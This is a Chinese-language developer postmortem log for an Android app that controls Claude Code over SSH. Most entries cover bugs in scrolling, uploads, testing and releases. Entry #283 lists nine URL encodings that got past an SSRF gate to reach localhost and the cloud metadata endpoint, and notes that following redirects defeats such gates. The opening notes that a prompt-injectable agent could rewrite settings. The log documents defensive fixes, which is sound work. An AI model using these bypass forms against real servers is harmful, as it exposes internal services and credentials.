Yxi 是手机替你写**另一台机器**的文件，而那台机器上还有一个会被注入的 agent 能改我们的输入。

**修法**：**白名单，默认拒绝，两道门。**
- 顶层键 `Lines.TOP_ALLOW`（model / effortLevel / modelSettings / outputStyle / includeCoAuthoredBy / autoCompactWindow /
  autoUpdatesChannel / skipDangerousModePermissionPrompt / skipWebFetchPreflight）；不在名单里的**不写、也不删**。
- env 按前缀 `ANTHROPIC_*` / `ENABLE_*` / `DISABLE_*` + 点名的几个 Claude Code 开关（`Lines.envAllowed`）。
- 门一：`Line.fromSettings`（数据进模型）；门二：`apply()` 落盘前再过一遍 —— 因为 lines.json 是从服务器读回来的，第一道门挡不住它。
- 高级 JSON 里有被拒的键**明说**（「这些键不允许由线路写入（安全）：…」），不悄悄丢。

⚠️ **通用**：**任何「用户配置 → 我们替他写到别处」的功能，写入面必须是白名单。**
判据是「谁能改我的输入」：只要输入源里有一个不可信写者，黑名单就一定漏。

## #269 1.1.10 还在「一闪一闪」：上下文数字一路往上爬 —— 空转兜底又把半截当完整了

**症状**（1.1.10 实拍）：进对话页后历史像放电影一样从旧滚到新，顶栏「上下文」从 294K 每帧一变爬到 915K。

**根因**：#261 ① 修成「数字节」之后，我还留了一条「连着四拍空转就放行」的兜底。手机网络上 4MB 历史
是一阵一阵来的，间隔随便就超过 1.2 秒 —— 兜底一触发，`caughtUp` 提前为 true，之后每 300ms 一批就
整体换一次 `items` + 追底一次：电影就是这么放出来的；`ctxUse` 每批被覆盖成「到目前为止最新的那条」，
数字就一路往上爬。另外 `caughtUp = !fresh || headLastKey == null` 里那个 `headLastKey == null`
（首屏拉空）也会让它一开始就 true。

**修法**：知道要灌多少字节时**只认字节数**，空转兜底只在 `expectBytes == 0`（拿不到大小）时用、且要连着
10 拍；首屏拉空也不放行 —— 宁可多等两秒空着。

**一般规律**：兜底分支是**给未知情况**用的，不是给「慢一点」用的。慢是正常态，兜底一旦在正常态下
会触发，它就成了主路径。写兜底时先问：正常情况下最慢能慢到什么程度？兜底会不会在那之前先响？

## #270 展开页眉的时候内容跟着往下挪 —— 是我 #268 那条修出来的

**症状**（慢动作实拍）：从收起状态往下拉，页眉和状态条滑进来的同时，正文也往下移；
展开完了正文又跳回去。

**根因**：#268 用 `collapseBy` 把状态条的**布局高度**按 barsFrac 从 0 长回来 —— 布局一变，
底下的列表就被推下去；展开完布局稳了，追底/锚点又把它拉回来。页眉本来就是**悬浮**的
（高度只进列表的 contentPadding，收放只平移画面），状态条应该照同一种做法。

**修法**：`floatTop`：状态提示 / 状态条 / 「正在做」装进一个**不占布局高度**的 Column（zIndex 画在列表上面），
量出真实高度进列表的 contentPadding；收放只做 translationY + alpha。

**一般规律**：跟页眉一起收放的东西，**收放只动画面不动布局**。凡是用布局高度做动画，
底下的内容一定会跟着动。

## #271 进对话页停在**两天前**的内容 —— 起点在窗口最老一条 + 追底动画被 300ms 的批次反复取消

**症状**（1.1.11 实拍，第四次报）：进 Yxi 会话，屏幕停在两天前的对话；顶栏状态是当前的（刚跑完 · done 1:16 PM），
说明数据没错，**是滚动位置错**。

**根因**（两半）：
1. `rememberLazyListState()` 从第 0 条开始画，而第 0 条 = 400 行历史窗口里**最老**的那条 —— 在 Yxi 这种一天写几百行的
   会话里正好是两天前。进场后要靠「追底 effect」把它滚到底。
2. 追底 effect 是 `snapshotFlow{…}.collectLatest{ delay(110); scrollToEnd(smooth) }`。**活跃会话每 300ms 换一批 items**，
   collectLatest 每次都把上一次没滚完的取消掉再等 110ms 重来 —— 在正在出字的会话里它**永远滚不到底**。
   闲着的会话看不出来（没有新批次），所以早先在小会话上测都过了。

**修法**：
- 数据一落地就 `listState.requestScrollToItem(Int.MAX_VALUE / 2, END_OFFSET)`（`pinToEnd`）：在**下一次布局**生效、
  不是动画、取消不了。三处：缓存摆出来 / 首屏 60 行到 / 400 行完整列表换上。
- 追底 effect 改 `collect`：顺序执行，每次最多 30 帧就完，攒几批多滚几下，不会跑丢。

**一般规律**：**`collectLatest` + 动画 = 只要上游比动画快，动画就永远做不完。** 跟随类逻辑要么用不可取消的
「下一帧生效」原语（requestScrollToItem），要么用 `collect` 顺序做完；「取消重来」只适合幂等且瞬时的操作。

## #272 进对话页跑到**几周前**项目第一天的对话 —— `tailStart` 拿不到就退回 0，整个转录从第一个字节重放

**症状**（1.1.11 实拍，第五次报同一现象）：截图停在项目最早那次「装公钥」的对话上 —— 比 400 行历史窗口早得多。

**根因**：`val start = tailStart(...)?.second ?: 0L`。连接正在重建（切后台回来那一刻）时 `exec` 回空串 →
`tailStart` 解不出数字 → null → **从第 1 个字节 `tail -c +1 -f`** —— 373MB 的转录从第一句话开始重放，
手机边解析边滚（就是「放电影」），最后停在项目第一天。**而且这个 0 写进了 ChatMemory**，之后每次进来都重放。
`expectBytes` 同时是 0，我的字节门也被绕过去了。

**修法**：tailStart 为 null 就**停**（提示「连接还没稳，正在重试…」），连接一稳 effect 自己重跑；
缓存条目 offset 为 0 的当中毒丢掉。

**一般规律**：**「拿不到」的兜底值不能是一个合法但灾难性的值。** 0 是合法偏移，语义却是「整个文件」；
兜底应该是「不做」，不是「从头做」。#261 ①（空转当灌完）、#269（兜底在正常态触发）和这条是同一类：
兜底分支在真实网络条件下会成为主路径，写之前先问「最坏它会把我们带到哪」。


## #273 退回看板再进 / 从后台切回，对话页涌出几周前的内容（第六次报，Mac E2E 第三轮复现）
- **症状**：头部还是当前会话，内容却从项目第一天开始一段段往后走；服务器上唯一的 `tail -c +N -f` 起点是对的（N≈文件末尾），之后也只追加了几十行新内容。logcat：`W YxiSSH: 远端 stderr: tail: …jsonl: file truncated`。
- **根因**：`SshSession.follow` 每 20 秒往流里 `printf '\n'` 一次防通道被掐，这一行**不在文件里**，而 ChatScreen 照样按「字节 +1」记进 `entry.offset`。停几分钟就多出十几字节 → 重进时 N 落在文件末尾之外 → GNU tail（coreutils 9.4）在文件下一次变长时判「file truncated」，**从第 0 字节把整份转录重放**。会话越闲越容易中（活跃会话文件涨得快，多出的字节被盖掉）。
- **实证**：30 字节的文件，`tail -c +34 -f`（多 3 字节）→ 追加一行 → 先报 `file truncated`，再把整文件吐出来；起点正好等于大小的对照组只吐新行。
- **修法**：① 收流时空行不计字节（JSONL 没有真空行）；② `TranscriptStream.streamFrom` 在服务器上先 `stat`，起点夹到文件大小以内 —— 任何一处数错都兜住。
- **还没兜的**：文件**真的**变短（Claude Code 重写转录）时 tail 同样会从 0 重放；没观察到过，观察到再加「stderr 出现 truncated 就断流重来」。
- **教训**：第 #261/#269/#271/#272 四轮都在猜时序、改滚动，全是症状层；**这次是先看 logcat 再查 `ps` 里 tail 的真实参数**，十分钟定位。有 stderr 就先看 stderr。

## #274 想给「临时会话」做 E2E，搭了半天测试机：三层链路都在骗你

- **症状**：模拟器里的 App 连测试机，连上了但每 ~18 秒断一次；sshd 报 `ssh_dispatch_run_fatal: incomplete message`，App 侧 logcat 是 `exec 挂了：session is down` / `channel request: timeout`。手动 `ssh` 进去跑命令却好好的。
- **根因（三个叠在一起，逐个排掉的）**：
  1. **嵌套隧道**。测试机是本机的 podman 容器，我用 `ssh -R 2200` 从本机打到 Mac —— 而 `ssh mac` 本身就走 Mac 那条反向隧道。等于 SSH 套 SSH，App 的多条并发通道全挤在最外层那一条连接上。判据：从 Mac 手动 `ssh -p 2200 … "head -c 3000000 /dev/urandom | md5"`，**3MB 传不完就断**。换成让 Mac 直接拨服务器公网（`ssh -L 2200:127.0.0.1:2299 root@<server>`，Mac 本来就这么连），同样 5MB 一次过。
  2. **模拟器 NAT**。一开始 App 填 `10.0.2.2:2200` 走 qemu 用户态转发，不稳；换 `adb reverse tcp:2200 tcp:2200`、App 填 `127.0.0.1:2200` 才稳。
  3. **CPU steal**。本机一度 **18–27% st**（宿主机在抢，不是自己的进程 —— 我停掉 gradle 守护后 us 从 18% 掉到 5.9%，st 反而涨到 26.9%）。容器里的 sshd 被饿着 → channel request 超时。诊断卡顿**先看 `top` 的 st**，别只看 load 和内存。
- **另一个坑**：`podman build` 报 `netavark: No such file or directory` → 加 `--network=host`。以及 **`podman exec … pkill sshd` 会把容器干掉**（sshd 是 PID 1），要重启 sshd 就用 `sleep infinity` 当 CMD、sshd 另起。
- **判据怎么定的**（照组规「E2E 判据要客观」）：容器里放一个假的 `claude` 桩，把收到的每一行写进 `/tmp/claude-in.log`，并画一个跟 Claude Code 一样的提示框（两条 `─` 中间一个 `❯`，`Model.borrowable` 就认这个）。再把 root 的 shell 换成一个 wrapper 把每条 SSH 命令记进 `/tmp/cmds.log`。于是「/clear 到底送没送」「App 到底跑了哪条命令」都是文件里的事实，不靠截屏猜。
- **⚠️ 重建容器会把 `podman exec` 改过的东西还原**：我 recreate 之后桩退回镜像里那版（不画提示框），`borrowable` 于是**正确地**拒发 `/clear` —— 差点被当成代码 bug。改过运行中容器的东西，重建后要重新装一遍。
- **教训**：E2E 跑不通时，先分清是**被测代码**还是**测试台**。这次三层链路全有问题，靠「手动跑同样的命令看能不能复现」逐层剥掉的；rig 的锅占了大半天。

## #275 Mac mini 模拟器 E2E 的四个小坑（cc-Yxi_pilot，2026-09-06）

**① 嵌套隧道连小命令都活不过 6 秒。** 想让模拟器连本机，第一版走「模拟器 → `adb reverse` → Mac:2201 → `ssh -R 2201` → 本机 sshd」。
连接能认证成功，然后 6 秒后 `exec 挂了：session is down` —— 连 `claude mcp list` 这种几 KB 的状态命令都跑不完（#274 记的是传 3MB 断，其实小流量也断）。
**修法**：不套隧道。Mac 本来就能直达本机公网 IP（它的反向隧道就是这么建的），模拟器走 Mac 的网**直连 `216.36.108.147:22`**，
hosts.json 写公网 IP + 本机 ed25519 hostKey，App 公钥进本机 `authorized_keys`（标签 `yxi@mac-emu`，别用 `yxi@android`，见 #65）。稳，而且就是用户的真实路径（#64）。

**② `adb shell` 会把 heredoc 脚本的后半段吃掉。** `ssh mac bash -s <<EOF … EOF` 里连着几条 `adb shell / adb push`，只有前两条执行了，后面静默消失 ——
adb 读 stdin，把还没执行的脚本正文当输入吞了。**修法**：脚本先落盘再 `bash /tmp/e.sh`，且每个 adb 调用 `</dev/null`。

**③ `pkill -f "2201:localhost:22"` 把自己杀了。** 模式串出现在当前 bash 的命令行里，`-f` 自匹配，整条命令退出码 144、后面的命令全没跑。
**修法**：`pgrep -f "^ssh .* -R 2201"` 锚定进程名再 kill。
⚠️ **2026-09-06 又踩了一次**（记了还踩）：`pkill -f 'sshd: root@notty'` 同样自匹配。最省事的通用写法是**方括号**，
让模式串本身匹配不到自己：
```bash
P=$(pgrep -f 'sshd: root@nott[y]'); [ -n "$P" ] && kill $P
```
（`nott[y]` 作为正则匹配 `notty`，但命令行里的字面量 `nott[y]` 不被它自己匹配。）

**④ 重新 scp 了测试包却忘了重装，`ClassNotFoundException: app.yxi.YunxiTest`。** 报错栈里 `codePath=/data/app/~~5bg0…` 没变就是没装上。
装前先 `unzip -p x.apk classes*.dex | strings | grep -c YunxiTest` 核一遍 dex 里有没有那个类，装后 `dumpsys package app.yxi.test | grep lastUpdateTime`。
另：`am instrument` 会重启被测 App 进程，**别和界面 E2E 同时跑**，放最后。

顺带记一笔没查透的：一次 `assembleDebug` 里 Kotlin 守护进程报 `Backend Internal error: Exception during IR lowering` → `Daemon compilation failed`，
Gradle 回退进程内编译后 BUILD SUCCESSFUL、包是新的；`touch` 一个文件重编不复现（内容没变 UP-TO-DATE）。再遇到先 `./gradlew --stop` 清守护进程重编。

## #277 「上传失败」里最难看的一半:它根本不失败,它永远转圈(第三轮修上传)

**症状**(老板 2026-09-06,第三次报):「一次上传很多图片还是失败,上传视频也还是失败」。前两轮修过 OOM(#267)和
共享通道(#115),还是不行。

**怎么抓到的**:Mac mini 模拟器 `adb emu network speed 1500:8000` + `delay 200:600`(模拟蜂窝),传输中途
`speed 1:1` 断流 8 秒。旧包报 `inputstream is closed`;放宽保活后**变成十分钟一个文件都没传完**。
`kill -3` 抓线程栈:

```
DefaultDispatcher-worker-1  TimedWaiting
  java.io.PipedInputStream.read          ← 没有超时,只是 wait(1000) 循环等下去
  com.jcraft.jsch.ChannelSftp.fill
  com.jcraft.jsch.ChannelSftp.header
  com.jcraft.jsch.ChannelSftp.checkStatus ← 在等一个永远不会来的 SFTP 应答
"Connect thread ... session"  Native      ← 会话线程卡在原生 socket 写上
```

**根因(两层)**:
1. **SFTP 的数据路径上没有任何超时**。链路一僵,`checkStatus` 就在管道流上无限等。
2. **jsch 自己的保活这时候是失效的**:TCP 发送缓冲被塞满 → 会话线程卡在 native 写 → 心跳包发不出去 →
   `serverAliveCountMax` 那套判死逻辑压根轮不到执行。**指望 SSH 层报错是不成立的。**

所以用户看到的不是错误提示,是**附件卡片永远停在「传输中」、发送键永远灰着、一个字的解释都没有**。
他把这个叫「上传失败」。

**修法**(`agent/Uploader.kt`,新文件):
- **没进度就掐**:60 秒没有任何字节动静 → 关通道(jsch 会关掉管道流,阻塞的 read 立刻抛);还不醒 →
  断整条连接,交给重连看门狗;下一次尝试**从断点续传**,传过的字节不白费。
- 收拾动作**扔独立守护线程**,不能 `launch` 成子协程 —— `coroutineScope` 会等所有子协程结束,
  而关通道自己也可能卡住,那等于把「永远转圈」原样换个地方又造一遍(自己差点写出来)。
- 顺带:传大文件期间把 `serverAliveCountMax` 从 2 放宽到 20(2s×20=40s)。**光这一条不够**
  (上面第 2 层),但能挡住「慢链路上一次正常抖动就把连接判死」。字节码确认 jsch 在会话循环里
  每次超时都现读这个字段,运行时改立刻生效。
- 重试逻辑从 `ChatScreen` 的 Composable 里抽进 `Uploader`:**原来它测不着**,修没修全靠读代码判断。
  `ShareActivity`(系统分享面板那条路)也切过来了 —— 它原来是一条共用通道 + 单次尝试。

**测试**(`androidTest/UploadStressTest.kt`):
- opus 审查指出原来那条「断流」测试**在链路没真出事时一次就成功、重试一行都没跑到**(会假过)。
  补了两条**不靠网络**的确定性故障注入:① `aliveSsh` 前两次返回 null(连接还没回来)→ 必须等而不是判失败;
  ② 传到一半直接 `disconnect()` → 必须重连 + 续传,且**服务器上的大小一字不差**(续传偏移算错的话
  文件是坏的,而界面还会显示成功)。

**一般规律**:**凡是阻塞等待远端应答的地方,都要有一个自己说了算的超时。** 别人的库(jsch)承诺的
liveness,在它自己被网络卡住的时候是不成立的。判断「卡住」用**有没有进度**,不用「连接是否还活着」——
后者在僵死连接上永远回答「活着」。

**和 #276 是一件事的两面**(cc-Yxi 同日踩的):SSH 层**既不会及时报错**(本条),**报的错也丢了信息**
(`SshSession.exec` 连接死掉时返回空串,调用方分不清「命令真没输出」和「连接断了」)。所以凡是靠
exec / SFTP 判断状态的地方,都要让被读的那头**留下可区分的痕迹**(cc-Yxi 的做法:让命令自己打
`__ALIVE__` / `__GONE__`),别从「没有」里推结论。

**还没做的**(cc-Yxi_pilot 2026-09-06 提):`exec` 那条路(Connect.status 探状态、TailscaleStatus.fetch、
微信探密钥)同样是在流上无限等,链路一僵面板就一直转圈。这次只修了上传这条路。

怎么做,cc-Yxi 同日给了方向,**记下来别丢**:不要在几十个调用点各加一个 `withTimeout`(必漏),
而是**在 `SshSession.exec` 里统一**:给它一个默认超时,并且**超时抛异常而不是返回空串** ——
让「连接死了」和「命令真没输出」从此分得开(这正是 #276 的根)。一处改动、所有调用方受益;
但也正因为会波及所有人,**三个人 + 老板都点头再动**。2026-09-06 的结论是:谁都先不做。

## #278 量「新依赖让包涨了多少」，入口没接就量 = 假数字（cc-Yxi_pilot，2026-09-06）

**症状**　给扫一扫加了 CameraX + ZXing 两组依赖，`assembleRelease` 量出来 **40.9 MB，跟加之前一模一样**。
差点据此回报「几乎不涨」。

**根因**　那会儿图标还没接上，**没有任何代码引用 `ScanScreen`**，R8 把整段（含两个库）当死代码剪掉了。
核验方法：`unzip -p <apk> classes*.dex | grep -c zxing` → **0**。

**修法 / 怎么避开**　量体积必须在**入口接上、功能真能走到**之后。量完再核一次「东西真在包里」：
```bash
for d in $(unzip -l $A | awk '/classes.*dex/{print $4}'); do unzip -p $A $d | grep -ac "zxing\|camera2"; done
```
接上之后真数是 **40.9 → 42.95 MB（+2.05 MB）**。
同理适用于任何「加了依赖但入口还没接」的评估 —— 体积、方法数、启动耗时都会量出假的好数字。

## #279 相机 / 传感器类功能，判据要用 `dumpsys` 而不是看界面（cc-Yxi_pilot，2026-09-06）

**症状**　审查指出「离开扫一扫页没 `unbindAll`，相机不释放」。界面上完全看不出来 —— 退出后一切正常。

**判据**　`adb shell dumpsys media.camera` 的事件日志，前后对比一目了然：
- **修复前**：`CONNECT device 1 … app.yxi` 之后一直开着，直到 `DISCONNECT … (PID 0)` + `DIED client(s) … Binder died`
  —— 也就是**进程被杀才释放**（用户看到的是状态栏绿点常亮、别的 App 打不开相机）。
- **修复后**：进出三次，三对 `CONNECT`/`DISCONNECT` 一一对应；收尾 `Active Camera Clients: []`、`Device 1 is closed`。

**怎么避开**　凡是占用系统独占资源的功能（相机、麦克风、定位、前台服务），**别用界面当判据**——
界面「看着正常」和「资源已释放」是两件事。对应的 dumpsys：`media.camera` / `media.audio_flinger` / `location` / `activity services`。
⚠️ 那几行有前导空格，grep 别锚 `^Device`（我第一次就这么查出个空结果，白绕一圈）。

## #281 「点切模型永远说它正忙着」—— 判据认不出画着会话名的输入框上边框

- **症状**：agent 早跑完了、输入框也是空的，点顶栏切模型仍然弹「它正忙着，或者输入框里有没发完的字 —— 等一下再点」（老板 2026-09-06 报，cc-Yxi_pilot 定位）。
- **根因**：判断「输入框空不空」要先靠**两条横线**定位输入框，而判据是「整行纯 `─`」。**Claude Code 现在把会话名画进了上边框**：
  ```
  ──────────────────────── omggrow_order ─     ← 上边框，掺了字 → 不算边框
  ❯                                            ← 空输入框
  ────────────────────────────────────────     ← 下边框 → 算
  ```
  真实 pane（`cc-omggrow_order`）实测：上边框 39 根横线 + 15 个其它字符。于是 `dividers` 只找到 1 条，`dividers.size < 2` 直接返回 false —— **跟忙不忙、有没有草稿完全无关，必然误报**。
- **影响不止一处**（同一个判据被抄了两份）：`Model.borrowable` 之外，`Live.parse` 也用它定位输入框；找不到上边框时 `boxTop` 落回 -1，状态行改在**整屏**里找，正文里的字可能被当成状态。
- **修法**：判据改成「横线占大头」——至少 8 根、且占整行 60% 以上（带名字的上边框是 72%，正文过不了）；并且**只留一份** `Live.isDivider`，`Model` 复用它，别再各写各的。
- **教训**：
  1. **别把「终端画面长什么样」当成稳定契约**。Claude Code 的边框、状态词、回执格式都在变（见 #276 的撇号、#280 的显示名），凡是从画面上认东西的判据都要**宽进严出**：认宽一点，但保留能区分正文的那条线（这里是 60%，不是「有横线就算」）。
  2. **同一个判据出现两份，就会有一天只修了一份**。发现重复的第一反应是合并，不是两边各改一次。
- **判据**：`LiveTest.上边框带会话名也算边框` / `正文里的横线不算边框`，样本取自真实 pane。⚠️ 写用例时注意：验「边框认得出」那块屏里**不能**放正在跑的状态行，否则 `borrowable` 会正确地因为「忙」而拒绝，验的就不是边框了（我第一版就这么错的）。

## #282 「上传附件之后点发送，话又回到输入框里」—— 发送不等重连（以及我先猜错的那个方向）

- **症状**（老板 2026-09-06）：「对话特别是上传有附件的时候还在对话框里面没发出去」。注意是 **Yxi 自己的输入框**，不是 Claude Code 那边的。
- **先说错的那个诊断**，因为它看起来太对了：带附件的消息一定是多行（头部若干行路径 + 正文），而项目里早有记录 —— 多行文本会被 Claude Code 当成**括号粘贴**，紧跟的回车被算进那一块、当成换行而不是提交（`SessionProbe.send` 里那段注释）。
  **写了压测去证伪**：打**真的 Claude Code**（不是桩 —— 桩按行读 stdin，根本没有「输入框」的概念，永远复现不出来），12 条 × 6 个长附件路径 × 多行正文，还模拟慢链路（文本分 4 块、每块间隔 250ms 到达）。结果 **旧写法和新写法都是 0 条卡住**。
  想通了：那 0.4 秒是**服务器端**在同一条命令里 `sleep` 的（`send-keys …; sleep 0.4; send-keys Enter`），**网络抖动拉不长它**。所以这条路上的时序跟手机网络无关，我猜的机制根本不成立。
- **真根因**：`Sender.send` 拿的是 Composable 里**抓好的那个** `SshSession`，开头 `if (!s.isConnected) return false` —— 连接一旦不是当初那条就**当场判失败**，然后（正确地）把草稿还回输入框。
  而**上传恰恰是最容易把连接换掉的操作**（几张图 / 一段视频，中途断线重连很常见）。上传那条路早就为此做了「等一条活着的连接」（`Uploader` + `ChatScreen.aliveSsh`，见 #277 那轮），**发送这条路没有**。
  所以症状精确地是「**特别是上传有附件的时候**」—— 老板那句话里的「上传」不是「因为附件消息长」，是「因为上传这个动作本身」。
- **修法**：`Sender.send` 改成收一个 `aliveSsh: suspend (Long) -> SshSession?`（跟上传同一个），等最多 20 秒；顺带把 `SessionProbe.send` 改成**发完回头查输入框空没空**（`Live.inputEmpty` 三态，`null` 时什么都不做），返回真假，`Sender` / `ShareActivity` 都认这个返回值 —— 原来「没抛异常」就算发出去了，那是猜的。
- **教训**：
  1. **能自圆其说的诊断不等于对的诊断**。这次是压测把它证伪的 —— 如果我没写那个压测，改完「回车重试」会看起来也修好了（因为顺带改了连接那块），然后错误的因果关系就进了文档。**修 bug 之前先复现，复现不出来就别声称修好了。**
  2. 用户描述里的**限定词**往往是最强的线索。「特别是上传的时候」我第一遍读成了「附件消息比较长」，第二遍才读成「上传这个动作本身」——后者才对。
  3. 又一次是「**把连接对象抓在手里**」：今天临时会话（#276 那轮）、上传（#277）、发送（这条），三处同一个毛病。**凡是跨越 await 的 SshSession 引用都要重新取，不能捕获。**
- **⚠️ 但这条规矩只对「一次性动作」是硬的**（cc-logto_yxi 2026-09-06 自查时划的线，我认同）：
  · **一次性动作**（发消息、传文件、切模型）—— 拿到死连接就是**一次性判死、把用户的东西弄丢**，必须重新取。
  · **轮询 / 展示类**（如 `ChatScreen` 里 120 秒一次的今日用量）—— effect 的 key 就是 `ssh`，重连时 `session = null` 再赋新值会**重启整个 effect**；失败又是 `catching` 吞掉、界面按「取不到就藏起来」处理。最坏是「重连那一瞬取不到，下一轮自己好」。**这种不用改。**
  别拿着规矩去把所有 `val s = ssh` 都改一遍 —— 分清「会自己好」和「弄丢东西」。

## #283 「让服务器去抓个网页」比看起来危险得多 —— 链接预览的闸门被九种写法绕过，跟跳转还能打到云元数据

- **背景**：老板要「对话里的网址渲染成预览卡」。抓 og 标签 = **让用户的服务器去访问那个地址一次**，而对话里的网址**不是用户输入的，是 agent 输出的** —— 那正是本项目文档里写明的注入面（`ssh/Shell.kt` 顶部）。
- **第一版的闸门**（字符串比较：拦 `localhost`、拦四段十进制私网 IP、拦带 `code=`/`token=` 的参数）**被审查用真 curl 逐个打穿九种写法**：

  | 写法 | 为什么漏 |
  |---|---|
  | `http://[::ffff:127.0.0.1]/` | 先 `substringBefore(':')` 再判，IPv6 整个塌成 `"["`；后面那两句 `host == "::1"` 是**死代码**，永远走不到 |
  | `http://2130706433/` `http://127.1/` | 用 `toIntOrNull` + 要求**正好四段**，短写和整数写法直接不进判断 |
  | `http://0177.0.0.1/` `http://0x7f.0.0.1/` | `toIntOrNull` 只认十进制，八进制/十六进制段被 `mapNotNull` **静默丢掉** |
  | `http://localhost./` | 结尾一个点，字面比较不相等 |
  | `http://%6cocalhost/` | 百分号编码，curl 会解码，我们没解 |
  | `http://0/` | `0` = `0.0.0.0` = 本机 |
  | `http://2852039166/` | 十进制写的 `169.254.169.254` —— **云厂商元数据地址，上面有这台机器的凭据** |

- **比上面所有加起来都严重的一条：`-L` 跟跳转。** 闸门只看**你给的那个字符串**，管不住它 302 到哪。一个完全合规的公网链接跳一次就能落到本机 / 内网 / 元数据地址 —— 审查实测走通。**`--max-redirs 3` 限的是次数，不是目的地。**
- **修法**（两层，缺一不可）：
  1. **字符串层归一化**：先摘方括号再切端口（不是反过来）、百分号解码、去结尾点；IPv4 认十进制/八进制/十六进制/短写并归一成四个字节再判；IPv6 单独判本机/链路本地/唯一本地/内嵌 v4。**每一种写法都配了用例**（`LinkPreviewTest.九种绕法都得拦住`），下次改闸门时漏掉哪种会当场红。
  2. **禁跳转 + 按解析出的真实 IP 复判**：`--max-redirs 0`，并在发请求前 `getent hosts` 拿真实 IP 再过一遍内网判断 —— 字符串层永远拦不住「域名解析到内网」（`localtest.me`、`*.nip.io`、攻击者自己的 A 记录）。代价是短链接预览不出来，**认这个代价**。
- **顺带三条同批的**：
  · 解析 og 的正则在长文本上是**二次方**复杂度（审查实测 200KB × 6 个标签名 **120 秒没跑完**），而它跑在**主线程** → 改成只取 `<head>` + 20KB 封顶 + 挪到 Default 线程。
  · 卡片头图的地址**是对方网页给的**，却没过闸门就从手机直连去下；解码也没限尺寸 → 都补上（`inJustDecodeBounds` 先量再采样）。
  · 用 `runCatching` 包 `ssh.exec` 会把**协程取消**也吞掉（`ssh/Catching.kt` 记着已栽五次，这是第六次）→ 换 `app.yxi.ssh.catching`。
- **教训**：
  1. **「让服务器帮我访问一个地址」是一类功能，不是一个功能** —— 凡是这种（预览、探活、导入、webhook 回调）都要按 SSRF 想一遍，而不是按「拼字符串对不对」想。
  2. **字符串闸门永远只是第一层。** 主机名有无数种等价写法，而真正决定去哪的是**解析出来的 IP** 和**跳转链**。要么禁跳转自己逐跳判，要么就别声称拦住了。
  3. 我写这道闸门时**自己就担心过跳转**（动手前跟老板说了「-L 是为了短链接」），但还是留着了 —— **想到了风险却因为功能好用而保留，等于没想到**。

## #284 发完版不做收尾，下一版就会把旧功能当新功能再发一遍

- **症状**：发 1.1.16 时才发现，「待发版」清单里四条有三条**在 1.1.15 就已经发出去了**（链接预览卡片、上传附件发送修复、授权等重连）。照单子写的更新说明因此把旧功能又列了一遍——那行字是推到用户手机上的。同时 `git log` 里版本号还停在 170/1.1.14，而线上 `latest.json` 已经是 171/1.1.15。
- **根因**：1.1.15 那次**只做了发布这一个动作**，收尾的三件事一件没做：清「待发版」、提交 `build.gradle.kts` 的版本号两行、往「已发布」补一条。于是清单变成了「攒着的」+「已经发过的」混在一起，谁也看不出区别。
- **为什么没当场发现**：`install.sh --publish` 校验得很严（包里的 versionCode、传过去的 sha256、公网真下一遍），但它**只管这一个包对不对，不管账本对不对**。发布成功的绿字给了「这件事办完了」的错觉。
- **修法 / 怎么避开**：把发版当成**四步**，不是一步 —— ① build + `--publish`；② 清空「待发版」；③ 提交版本号那两行；④ 往「已发布」补一条（带上审查拦下了什么、哪些没验）。前一步的绿字不代表后三步做了。
- **怎么查线上到底是什么**：`ssh hk13 "cat /var/www/yxi/<下载 token>/latest.json"` —— 手机的更新检查只认这个文件，它是唯一的事实。**别拿 handover 的「已发布」当事实**，那是人写的、正是会漏的那一环。
- **教训**：**清单不清，就会从「待办」悄悄变成「已办 + 待办」的混合物**，而混合物里的每一条看起来都一样。判断一条是不是真没发，唯一可靠的办法是拿**发布时刻**去卡 `git log`（1.1.15 发于 10:18 → 10:12 那个提交在里面，12:06 那个不在）。

## #285 把界面上的**提示文字**当成了状态 —— 同一句话进了服务器五次

- **症状**（老板 2026-09-06 录屏 + 终端截图）：点发送，气泡出来了、输入框也清空了；约 7 秒后弹出「没发出去，话给你留在输入框了」，草稿被还回框里。他再发，如此五次 —— **终端里那条消息实实在在到了五次**。
- **根因**：Claude Code 忙着的时候，发过去的话进**排队**，这时它把自己的占位提示画进输入框：

  ```
  ───────────────────
  ❯ Press up to edit queued messages
  ───────────────────
  ```

  `Live.inputEmpty` 的判据是「两条横线之间、`❯` 后面还有没有字」。这句提示有字 → 判成「草稿还堆着」→ 调用方补三次回车 → 最后一眼还是 false → 报失败、还草稿。**而这句提示恰恰是「已经收下了」的证据**（排队 = 收下，只是还没轮到）。
- **修法**：`inputEmpty` 认出这句占位提示就返回 `true`。用例用**真会话抓的屏**（`tmux capture-pane -p`，让 haiku 写长文时插两条），不是自己编的形状。
- **为什么上午那版没抓到**：那轮的 E2E 桩和压测**从来没让消息排过队** —— 桩按行读 stdin，压测每条发完立刻 Esc 打断。**没被覆盖到的不是代码分支，是「对面处于什么状态」。**
- **教训（这条最值钱）**：
  1. **判据落在表象上，就会在表象换一种画法的那天失效。** 同一天三条同类：我这条把「提示文字」当成「框里有草稿」；上午那条把「两条横线之间有几行」当成「框里有东西」；Entertainment 那条把「判过了」当成「可以跳过」。
  2. **补发类动作的代价是乘以次数的。** 判据不牢 + 自动重试 = 同一条消息进去五次。凡是「没成功就再来一次」的地方，先问「判成功的那个依据，牢不牢」。
  3. **「发出去了」曾经是猜的，现在是查的 —— 但查的东西本身也可能是错的。** 加一道校验不等于加了正确性。

## #286 全套测试从 09-05 起一直红着，没人发现

- **症状**：为了验 #285 的修法跑了一次 `connectedDebugAndroidTest`，255 条里 9 条失败。其中 **2 条从 09-05 / 09-03 就一直红着**：
  · `AttachmentsTest.并发上传不会都叫图片1` —— 数 `header()` 的行数用的是老契约。09-05 我给 header 补了结尾换行（要跟正文隔开），`"a\nb\n".lines()` 是 3 段不是 2，用例没跟着改。
  · `I18nTest.没有原样照抄的中文` —— 09-03 加组规示例时，英文译文里留着中文路径 `E:\资料`。
- **另外 7 条不是坏，是没配**：`UploadStressTest` 要连一台真 SSH 主机，**故意在没配时失败而不是静默跳过**（它自己的注释写着「没跑和跑过了必须分得清」）。配法：容器起 sshd → 服务器 `ssh -R 22299:127.0.0.1:<容器端口> mac` → 传参 `-e stressKey <base64url 私钥> -e stressHost 10.0.2.2 -e stressPort 22299 -e stressUser root`。配上之后 7 条全过，含 160MB 那档。
- **根因**：发版前的关卡是「子代理审查 + E2E」，**全套测试不在关卡里**。而这几天每次发版都过了审查和 E2E —— 关卡本身是绿的，红的地方没人看。
